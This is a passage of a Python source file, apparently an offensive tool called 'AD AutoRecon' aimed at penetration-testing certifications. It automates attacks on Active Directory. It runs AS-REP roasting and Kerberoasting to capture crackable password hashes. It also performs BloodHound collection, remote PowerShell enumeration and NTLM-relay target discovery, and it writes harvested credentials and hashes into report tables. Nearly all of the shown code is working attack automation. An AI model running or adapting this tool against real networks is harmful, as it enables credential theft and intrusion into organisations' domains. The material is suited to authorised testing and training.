            dns_match = re.search(r'dNSHostName: (.+)', entry)
            dns = dns_match.group(1).strip() if dns_match else ""
            
            # Get operating system
            os_match = re.search(r'operatingSystem: (.+)', entry)
            os = os_match.group(1).strip() if os_match else ""
            
            # Add computer if not already in results
            if not any(c["name"] == computer_name for c in result["computers"]):
                result["computers"].append({
                    "name": computer_name,
                    "dn": dn,
                    "dns": dns,
                    "os": os
                })
                
    def kerberos_enumeration(self, target: str) -> Dict[str, Any]:
        """Perform Kerberos-related enumeration and attacks"""
        Logger.section(f"Kerberos Enumeration: {target}")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_safe = target.replace('.', '_')
        result = {"target": target, "kerberoastable_users": [], "asreproastable_users": []}
        
        # We need domain name for Kerberos attacks
        domain = self.domain_name
        if not domain:
            Logger.warning("No domain name found. Kerberos enumeration may fail.")
            
            # Try to guess domain from target hostname
            if not self.is_ip_address(target):
                domain_parts = target.split('.')
                if len(domain_parts) > 1:
                    domain = '.'.join(domain_parts[1:])
                    Logger.info(f"Guessing domain: {domain}")
        
        # Try AS-REP Roasting first (no credentials needed)
        if self.tool_paths.get("GetNPUsers.py") and domain:
            Logger.info(f"Attempting AS-REP Roasting against {domain}")
            
            asrep_output_file = f"{target_safe}_asreproast_{timestamp}.txt"
            cmd = f"{self.tool_paths['GetNPUsers.py']} {domain}/ -dc-ip {target} -request -format hashcat -outputfile {self.creds_dir / asrep_output_file}"
            asrep_output = self.execute_command(cmd, "AS-REP Roasting")
            
            # Save output
            self.save_results(asrep_output, f"{target_safe}_asreproast_attempt_{timestamp}.txt", self.creds_dir)
            
            # Check if any users were found
            if os.path.exists(self.creds_dir / asrep_output_file):
                with open(self.creds_dir / asrep_output_file, 'r') as f:
                    asrep_hashes = f.read()
                    
                if asrep_hashes.strip():
                    Logger.success("AS-REP Roastable users found!")
                    
                    # Parse users from hashes
                    user_pattern = r'([^@]+)@([^:]+)'
                    asrep_users = re.findall(user_pattern, asrep_hashes)
                    
                    for username, domain in asrep_users:
                        if {"domain": domain, "username": username} not in result["asreproastable_users"]:
                            result["asreproastable_users"].append({
                                "domain": domain,
                                "username": username
                            })
                            
                    # Parse for hashes
                    self.parse_creds_from_output(asrep_hashes, "asreproast")
        
        # Try Kerberoasting with valid credentials
        if self.tool_paths.get("GetUserSPNs.py") and domain:
            # Get credentials with passwords
            creds = [c for c in self._get_all_credentials() if c["password"]]
            
            for cred in creds:
                username = cred["username"]
                password = cred["password"]
                
                Logger.info(f"Attempting Kerberoasting with {username}")
                
                krb_output_file = f"{target_safe}_kerberoast_{username}_{timestamp}.txt"
                cmd = f"{self.tool_paths['GetUserSPNs.py']} {domain}/{username}:{password} -dc-ip {target} -request -outputfile {self.creds_dir / krb_output_file}"
                krb_output = self.execute_command(cmd, f"Kerberoasting with {username}")
                
                # Save output
                self.save_results(krb_output, f"{target_safe}_kerberoast_attempt_{username}_{timestamp}.txt", self.creds_dir)
                
                # Check if any SPNs were found
                if "ServicePrincipalName" in krb_output and os.path.exists(self.creds_dir / krb_output_file):
                    Logger.success("Kerberoastable accounts found!")
                    
                    with open(self.creds_dir / krb_output_file, 'r') as f:
                        kerb_hashes = f.read()
                        
                    # Parse users from output
                    spn_pattern = r'ServicePrincipalName\s+:\s+(\S+)/(\S+)'
                    spn_matches = re.findall(spn_pattern, krb_output)
                    
                    for service, hostname in spn_matches:
                        # Extract username from hash file
                        user_match = re.search(rf'\\([^:]+)@{domain}', kerb_hashes)
                        if user_match:
                            username = user_match.group(1)
                            if {"domain": domain, "username": username, "service": service, "hostname": hostname} not in result["kerberoastable_users"]:
                                result["kerberoastable_users"].append({
                                    "domain": domain,
                                    "username": username,
                                    "service": service,
                                    "hostname": hostname
                                })
                    
                    # Parse hashes
                    self.parse_creds_from_output(kerb_hashes, "kerberoast")
                    
                    # Found kerberoastable accounts, don't need to try more credentials
                    break
                        
        # Try kerberoast with our kerberoast wrapper tool if available
        if self.tool_paths.get("kerberoast") and domain:
            Logger.info(f"Running Kerberoast automation script against {target}")
            
            cmd = f"python3 {self.tool_paths['kerberoast']} -t {target}"
            krb_auto_output = self.execute_command(cmd, "Kerberoast automation")
            
            # Save output
            self.save_results(krb_auto_output, f"{target_safe}_kerberoast_auto_{timestamp}.txt", self.creds_dir)
            
            # Parse any creds from output
            self.parse_creds_from_output(krb_auto_output, "kerberoast_auto")
        
        # Save all Kerberos enumeration results
        self.save_json_results(result, f"{target_safe}_kerberos_enum_{timestamp}.json", self.domain_dir)
        
        return result
        
    def bloodhound_collection(self, target: str) -> Dict[str, Any]:
        """Collect Active Directory data using BloodHound"""
        Logger.section(f"BloodHound Collection: {target}")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_safe = target.replace('.', '_')
        result = {"target": target, "collection_status": False}
        
        # Try with each valid credential
        creds = [c for c in self._get_all_credentials() if c["password"]]
        
        if self.tool_paths.get("bloodhound-python") and self.domain_name:
            for cred in creds:
                username = cred["username"]
                password = cred["password"]
                domain = self.domain_name
                
                Logger.info(f"Attempting BloodHound collection with {domain}\\{username}")
                
                # Create output directory
                bloodhound_dir = self.domain_dir / "bloodhound"
                bloodhound_dir.mkdir(exist_ok=True)
                
                # Run BloodHound Python collector
                cmd = f"{self.tool_paths['bloodhound-python']} -c All -u {username} -p {password} -d {domain} --zip -dc {target} -ns {target} -o {bloodhound_dir}"
                bh_output = self.execute_command(cmd, f"BloodHound collection with {username}")
                
                # Save output
                self.save_results(bh_output, f"{target_safe}_bloodhound_collection_{timestamp}.txt", bloodhound_dir)
                
                # Check if collection was successful
                if "Compressing collected data" in bh_output:
                    Logger.success("BloodHound collection complete!")
                    result["collection_status"] = True
                    
                    # Look for the ZIP file
                    zip_pattern = r'Saving zip file ([\w\-\.]+)'
                    zip_match = re.search(zip_pattern, bh_output)
                    
                    if zip_match:
                        zip_file = zip_match.group(1)
                        Logger.success(f"BloodHound data saved to: {bloodhound_dir / zip_file}")
                        result["zip_file"] = str(bloodhound_dir / zip_file)
                    
                    # Stop after successful collection
                    break
        else:
            Logger.warning("BloodHound Python not found or domain name not available")
            
        # Save BloodHound collection results
        self.save_json_results(result, f"{target_safe}_bloodhound_{timestamp}.json", self.domain_dir)
        
        return result
        
    def powershell_enumeration(self, target: str) -> Dict[str, Any]:
        """Use PowerShell enumeration script if available"""
        Logger.section(f"PowerShell Enumeration: {target}")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_safe = target.replace('.', '_')
        result = {"target": target, "status": False}
        
        if not self.tool_paths.get("powershell_enum"):
            Logger.warning("PowerShell enumeration script not found")
            return result
            
        # Try with each valid credential
        creds = [c for c in self._get_all_credentials() if c["password"]]
        
        for cred in creds:
            username = cred["username"]
            password = cred["password"]
            
            Logger.info(f"Attempting PowerShell enumeration with {username}")
            
            cmd = f"python3 {self.tool_paths['powershell_enum']} remote -t {target} -u {username} -p {password}"
            ps_output = self.execute_command(cmd, f"PowerShell enumeration with {username}")
            
            # Save output
            self.save_results(ps_output, f"{target_safe}_powershell_enum_{timestamp}.txt", self.domain_dir)
            
            # Check if enumeration was successful
            if "AD Enumeration Complete" in ps_output:
                Logger.success("PowerShell enumeration complete!")
                result["status"] = True
                
                # Extract path to results if mentioned in output
                path_pattern = r"Results stored on remote system: ([^\s]+)"
                path_match = re.search(path_pattern, ps_output)
                
                if path_match:
                    result["results_path"] = path_match.group(1)
                    Logger.info(f"PowerShell enumeration results stored at: {result['results_path']}")
                
                # Stop after successful enumeration
                break
        
        # Save PowerShell enumeration results
        self.save_json_results(result, f"{target_safe}_powershell_enum_{timestamp}.json", self.domain_dir)
        
        return result
        
    def vulnerability_checks(self, target: str) -> Dict[str, Any]:
        """Check for common AD vulnerabilities"""
        Logger.section(f"Vulnerability Checks: {target}")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_safe = target.replace('.', '_')
        result = {
            "target": target,
            "zerologon": {"checked": False, "vulnerable": False},
            "petitpotam": {"checked": False, "vulnerable": False},
            "printnightmare": {"checked": False, "vulnerable": False},
            "ntlm_relay": {"checked": False, "vulnerable": False},
            "smb_signing": {"checked": False, "vulnerable": False}
        }
        
        # Try SMB signing check
        netexec_tool = self.tool_paths.get("netexec") or self.tool_paths.get("crackmapexec")
        if netexec_tool:
            Logger.info("Checking for SMB signing")
            
            cmd = f"{netexec_tool} smb {target} --gen-relay-list {self.vulns_dir / 'relay_targets.txt'}"
            smb_sign_output = self.execute_command(cmd, "SMB signing check")
            
            # Save output
            self.save_results(smb_sign_output, f"{target_safe}_smb_signing_{timestamp}.txt", self.vulns_dir)
            
            # Check if SMB signing is disabled
            result["smb_signing"]["checked"] = True
            
            # Check if target was added to relay list
            relay_file = self.vulns_dir / 'relay_targets.txt'
            if relay_file.exists():
                with open(relay_file, 'r') as f:
                    relay_targets = f.read()
                    
                if target in relay_targets:
                    Logger.warning(f"{target} has SMB signing disabled - vulnerable to NTLM relay!")
                    result["smb_signing"]["vulnerable"] = True
                    result["ntlm_relay"]["checked"] = True
                    result["ntlm_relay"]["vulnerable"] = True
        
        # Save vulnerability check results
        self.save_json_results(result, f"{target_safe}_vuln_checks_{timestamp}.json", self.vulns_dir)
        
        return result
        
    def execute_workflow(self, target: str, quick_scan: bool = False, skip_network: bool = False, skip: List[str] = None) -> Dict[str, Any]:
        """Execute full reconnaissance workflow against a target"""
        self.start_time = datetime.now()
        Logger.section(f"Starting AD AutoRecon against: {target}")
        Logger.info(f"Start Time: {self.start_time}")
        
        skip = skip or []
        workflow_results = {
            "target": target,
            "start_time": str(self.start_time),
            "quick_scan": quick_scan,
            "skipped_phases": skip,
            "phases": {}
        }
        
        try:
            # Phase 1: Network discovery (if not skipped)
            if "network" not in skip and not skip_network:
                Logger.info("Starting Phase 1: Network Discovery")
                net_results = self.network_discovery(target, quick_scan)
                workflow_results["phases"]["network"] = {"status": "complete", "hosts_found": len(net_results.get("discovered_hosts", []))}
                
            # Phase 2: SMB Enumeration
            if "smb" not in skip:
                Logger.info("Starting Phase 2: SMB Enumeration")
                smb_results = self.smb_enumeration(target)
                workflow_results["phases"]["smb"] = {"status": "complete", "shares_found": len(smb_results.get("shares", []))}
                
            # Phase 3: LDAP Enumeration
            if "ldap" not in skip:
                Logger.info("Starting Phase 3: LDAP Enumeration")
                ldap_results = self.ldap_enumeration(target)
                workflow_results["phases"]["ldap"] = {"status": "complete", "users_found": len(ldap_results.get("users", []))}
                
            # Phase 4: Kerberos Enumeration
            if "kerberos" not in skip:
                Logger.info("Starting Phase 4: Kerberos Enumeration")
                kerb_results = self.kerberos_enumeration(target)
                workflow_results["phases"]["kerberos"] = {
                    "status": "complete", 
                    "kerberoastable_users": len(kerb_results.get("kerberoastable_users", [])),
                    "asreproastable_users": len(kerb_results.get("asreproastable_users", []))
                }
                
            # Phase 5: BloodHound Collection
            if "bloodhound" not in skip:
                Logger.info("Starting Phase 5: BloodHound Collection")
                bh_results = self.bloodhound_collection(target)
                workflow_results["phases"]["bloodhound"] = {"status": "complete", "collection_success": bh_results.get("collection_status", False)}
                
            # Phase 6: PowerShell Enumeration
            if "powershell" not in skip and not quick_scan:
                Logger.info("Starting Phase 6: PowerShell Enumeration")
                ps_results = self.powershell_enumeration(target)
                workflow_results["phases"]["powershell"] = {"status": "complete", "enumeration_success": ps_results.get("status", False)}
                
            # Phase 7: Vulnerability Checks
            if "vulns" not in skip:
                Logger.info("Starting Phase 7: Vulnerability Checks")
                vuln_results = self.vulnerability_checks(target)
                workflow_results["phases"]["vulnerabilities"] = {"status": "complete"}
                
                # Add specific vulnerability findings
                for vuln, status in vuln_results.items():
                    if isinstance(status, dict) and status.get("checked", False) and status.get("vulnerable", False):
                        workflow_results["phases"]["vulnerabilities"][vuln] = "VULNERABLE"
                
        except KeyboardInterrupt:
            Logger.warning("Reconnaissance interrupted by user")
            workflow_results["interrupted"] = True
        except Exception as e:
            Logger.error(f"Error during reconnaissance: {str(e)}")
            workflow_results["error"] = str(e)
        
        # Complete the workflow
        self.end_time = datetime.now()
        duration = self.end_time - self.start_time
        
        workflow_results["end_time"] = str(self.end_time)
        workflow_results["duration"] = str(duration)
        workflow_results["credentials_found"] = len(self.credentials)
        workflow_results["hashes_found"] = len(self.hashes)
        
        Logger.section("AD AutoRecon Complete")
        Logger.info(f"Start Time: {self.start_time}")
        Logger.info(f"End Time: {self.end_time}")
        Logger.info(f"Duration: {duration}")
        Logger.info(f"Credentials found: {len(self.credentials)}")
        Logger.info(f"Hashes found: {len(self.hashes)}")
        
        # Save final report
        report_file = self.results_dir / f"autorecon_report_{target.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(workflow_results, f, indent=4)
            
        Logger.success(f"Final report saved to: {report_file}")
        
        return workflow_results
        
    def multi_target_scan(self, targets: List[str], quick_scan: bool = False, skip: List[str] = None, threads: int = None) -> Dict[str, Any]:
        """Execute reconnaissance against multiple targets"""
        self.start_time = datetime.now()
        Logger.section(f"Starting AD AutoRecon against {len(targets)} targets")
        Logger.info(f"Start Time: {self.start_time}")
        
        # Set number of threads
        max_threads = threads or MAX_THREADS
        
        # Calculate network ranges for initial network discovery
        network_targets = []
        host_targets = []
        
        for target in targets:
            target_type = self.determine_target_type(target)
            if target_type == "subnet":
                network_targets.append(target)
            else:
                host_targets.append(target)
        
        all_results = {
            "targets": targets,
            "start_time": str(self.start_time),
            "target_results": {}
        }
        
        # Phase 1: Network discovery for subnet targets (sequential)
        if network_targets:
            Logger.section(f"Network Discovery Phase")
            discovered_hosts = []
            
            for network in network_targets:
                Logger.info(f"Scanning network: {network}")
                net_results = self.network_discovery(network, quick_scan)
                
                # Add discovered hosts to the list
                for host in net_results.get("discovered_hosts", []):
                    ip = host.get("ip")
                    if ip and ip not in host_targets and ip not in discovered_hosts:
                        discovered_hosts.append(ip)
                        
            # Add discovered hosts to the host targets
            Logger.info(f"Discovered {len(discovered_hosts)} additional hosts")
            host_targets.extend(discovered_hosts)
            
            # Remove duplicates
            host_targets = list(set(host_targets))
            
            Logger.info(f"Total of {len(host_targets)} hosts to scan")
        
        # Phase 2: Multi-threaded scan of all identified hosts
        if host_targets:
            Logger.section(f"Host Scanning Phase")
            Logger.info(f"Scanning {len(host_targets)} hosts with {max_threads} threads")
            
            # Use ThreadPoolExecutor for parallel scanning
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                # Submit all targets to the thread pool
                future_to_target = {
                    executor.submit(self.execute_workflow, target, quick_scan, True, skip): target 
                    for target in host_targets
                }
                
                # Process results as they complete
                for i, future in enumerate(as_completed(future_to_target)):
                    target = future_to_target[future]
                    Logger.progress(i + 1, len(host_targets), f"Scanning hosts", f"({i + 1}/{len(host_targets)})")
                    
                    try:
                        result = future.result()
                        all_results["target_results"][target] = result
                    except Exception as e:
                        Logger.error(f"Error scanning {target}: {str(e)}")
                        all_results["target_results"][target] = {"error": str(e)}
        
        # Complete the multi-target scan
        self.end_time = datetime.now()
        duration = self.end_time - self.start_time
        
        all_results["end_time"] = str(self.end_time)
        all_results["duration"] = str(duration)
        all_results["credentials_found"] = len(self.credentials)
        all_results["hashes_found"] = len(self.hashes)
        
        Logger.section("Multi-Target AD AutoRecon Complete")
        Logger.info(f"Start Time: {self.start_time}")
        Logger.info(f"End Time: {self.end_time}")
        Logger.info(f"Duration: {duration}")
        Logger.info(f"Hosts scanned: {len(host_targets)}")
        Logger.info(f"Credentials found: {len(self.credentials)}")
        Logger.info(f"Hashes found: {len(self.hashes)}")
        
        # Save final report
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = self.results_dir / f"autorecon_multitarget_report_{timestamp}.json"
        with open(report_file, 'w') as f:
            json.dump(all_results, f, indent=4)
            
        Logger.success(f"Final report saved to: {report_file}")
        
        return all_results
        
    def generate_report(self, consolidated: bool = False) -> str:
        """Generate a human-readable report in markdown format"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        if consolidated:
            # Generate report for all scans in the results directory
            report_title = "# Consolidated AD AutoRecon Report\n\n"
            report_file = self.results_dir / f"consolidated_report_{timestamp}.md"
        else:
            # Generate report just for the most recent scan
            report_title = "# AD AutoRecon Report\n\n"
            report_file = self.results_dir / f"report_{timestamp}.md"
        
        report = report_title
        report += f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        
        # Add summary of credentials found
        report += "## Credentials Found\n\n"
        
        if self.credentials:
            report += "| Domain | Username | Password | Source |\n"
            report += "|--------|----------|----------|--------|\n"
            
            for cred in self.credentials:
                domain = cred.get("domain", "")
                username = cred.get("username", "")
                password = cred.get("password", "")
                source = cred.get("source", "")
                
                report += f"| {domain} | {username} | {password} | {source} |\n"
        else:
            report += "*No credentials found*\n\n"
            
        # Add summary of hashes found
        report += "\n## Hashes Found\n\n"
        
        if self.hashes:
            report += "| Domain | Username | Hash | Source |\n"
            report += "|--------|----------|------|--------|\n"
            
            for hash_entry in self.hashes:
                domain = hash_entry.get("domain", "")
                username = hash_entry.get("username", "")
                hash_val = hash_entry.get("hash", "")
                source = hash_entry.get("source", "")
                
                # Truncate hash for readability
                if len(hash_val) > 20:
                    display_hash = f"{hash_val[:10]}...{hash_val[-10:]}"
                else:
                    display_hash = hash_val
                    
                report += f"| {domain} | {username} | {display_hash} | {source} |\n"
        else:
            report += "*No hashes found*\n\n"
            
        # Add domain information
        report += "\n## Domain Information\n\n"
        
        if self.domain_name:
            report += f"**Domain Name:** {self.domain_name}\n\n"
            
            if self.domain_controllers:
                report += "**Domain Controllers:**\n\n"
                for dc in self.domain_controllers:
                    report += f"- {dc}\n"
            else:
                report += "*No domain controllers identified*\n\n"
        else:
            report += "*No domain information found*\n\n"
            
        # Add vulnerability findings
        report += "\n## Vulnerability Findings\n\n"
        
        # Look for vulnerability result files
        vuln_files = list(self.vulns_dir.glob("*_vuln_checks_*.json"))
        
        if vuln_files:
            vulns_found = False
            
            for vuln_file in vuln_files:
                try:
                    with open(vuln_file, 'r') as f:
                        vuln_data = json.load(f)
                        
                    target = vuln_data.get("target", "Unknown")
                    
                    # Check for vulnerabilities
                    for vuln_name, status in vuln_data.items():
                        if isinstance(status, dict) and status.get("checked", False) and status.get("vulnerable", False):
                            if not vulns_found:
                                report += "| Target | Vulnerability | Status |\n"
                                report += "|--------|--------------|--------|\n"
                                vulns_found = True
                                
                            report += f"| {target} | {vuln_name} | **VULNERABLE** |\n"
                except:
                    continue
                    
            if not vulns_found:
                report += "*No vulnerabilities found*\n\n"
        else:
            report += "*No vulnerability checks performed*\n\n"
            
        # Write report to file
        with open(report_file, 'w') as f:
            f.write(report)
            
        Logger.success(f"Report generated and saved to: {report_file}")
        
        return str(report_file)

def main():
    """Main function for AD AutoRecon tool"""
    banner = f"""
{Colors.BOLD}{Colors.BLUE}
   _____ ______     ___          __      ______                    
  /  _  \\\\  _  \\   /   |  __  __/  |_   /  __  \\  ____   ____  ___ 
 /  /_\\  \\ | | |  / /| | |  |  \\   __\\  >      < / __ \\_/ ___\\/   \\
/    |    \\| | | / /_| | |  |  /|  |   /   --   \\  ___/\\  \\__/  Y  \\
\\____|__  /_| |_|\\___  | |____/ |__|   \\______  /\\___  >\\___  >___  /
        \\/           \\/                       \\/     \\/     \\/    \\/
{Colors.ENDC}
{Colors.BOLD}Active Directory Automated Reconnaissance Tool{Colors.ENDC}
{Colors.CYAN}For PNPT, CRTS, and C-ADPenX certifications{Colors.ENDC}
"""
    print(banner)
    
    parser = argparse.ArgumentParser(description='AD AutoRecon - Comprehensive Active Directory reconnaissance')
    
    # Target options
    target_group = parser.add_argument_group('Target Selection')
    target_group.add_argument('-t', '--target', help='Target IP, hostname, or CIDR range')
    target_group.add_argument('-tL', '--target-list', help='File containing list of targets (one per line)')
    
    # Scan options
    scan_group = parser.add_argument_group('Scan Options')
    scan_group.add_argument('-q', '--quick', action='store_true', help='Perform quick scan (fewer checks)')
    scan_group.add_argument('-o', '--output-dir', help='Custom output directory')
    scan_group.add_argument('--threads', type=int, default=MAX_THREADS, help=f'Maximum number of threads (default: {MAX_THREADS})')
    
    # Skip options
    skip_group = parser.add_argument_group('Skip Options')
    skip_group.add_argument('--skip-network', action='store_true', help='Skip initial network discovery')
    skip_group.add_argument('--skip-smb', action='store_true', help='Skip SMB enumeration')
    skip_group.add_argument('--skip-ldap', action='store_true', help='Skip LDAP enumeration')
    skip_group.add_argument('--skip-kerberos', action='store_true', help='Skip Kerberos enumeration')
    skip_group.add_argument('--skip-bloodhound', action='store_true', help='Skip BloodHound collection')
    skip_group.add_argument('--skip-powershell', action='store_true', help='Skip PowerShell enumeration')
    skip_group.add_argument('--skip-vulns', action='store_true', help='Skip vulnerability checks')
    
    # Report options
    report_group = parser.add_argument_group('Report Options')
    report_group.add_argument('--report', action='store_true', help='Generate markdown report after scan')
    report_group.add_argument('--report-only', action='store_true', help='Generate report from previous scans only')
    
    args = parser.parse_args()
    
    # Initialize AD AutoRecon
    autorecon = ADAutoRecon(output_dir=args.output_dir)
    
    # Build skip list
    skip = []
    if args.skip_network: skip.append("network")
    if args.skip_smb: skip.append("smb")
    if args.skip_ldap: skip.append("ldap")
    if args.skip_kerberos: skip.append("kerberos")
    if args.skip_bloodhound: skip.append("bloodhound")
    if args.skip_powershell: skip.append("powershell")
    if args.skip_vulns: skip.append("vulns")
    
    # Generate report only
    if args.report_only:
        autorecon.generate_report(consolidated=True)
        return
    
    # Get targets
    targets = []
    
    if args.target:
        targets.append(args.target)
    
    if args.target_list:
        try:
            with open(args.target_list, 'r') as f:
                file_targets = f.read().splitlines()
                targets.extend([t.strip() for t in file_targets if t.strip()])
        except Exception as e:
            Logger.error(f"Error reading target list: {str(e)}")
            return
    
    # Use targets from config if none specified
    if not targets and TARGETS:
        targets = TARGETS
    
    if not targets:
        Logger.error("No targets specified. Use -t/--target or -tL/--target-list")
        parser.print_help()
        return
    
    # Run scan against single target or multi-target
    if len(targets) == 1:
        autorecon.execute_workflow(
            target=targets[0],
            quick_scan=args.quick,
            skip_network=args.skip_network,
            skip=skip
        )
    else:
        autorecon.multi_target_scan(
            targets=targets,
            quick_scan=args.quick,
            skip=skip,
            threads=args.threads
        )
    
    # Generate report if requested
    if args.report:
        autorecon.generate_report(consolidated=True)

if __name__ == "__main__":
    main()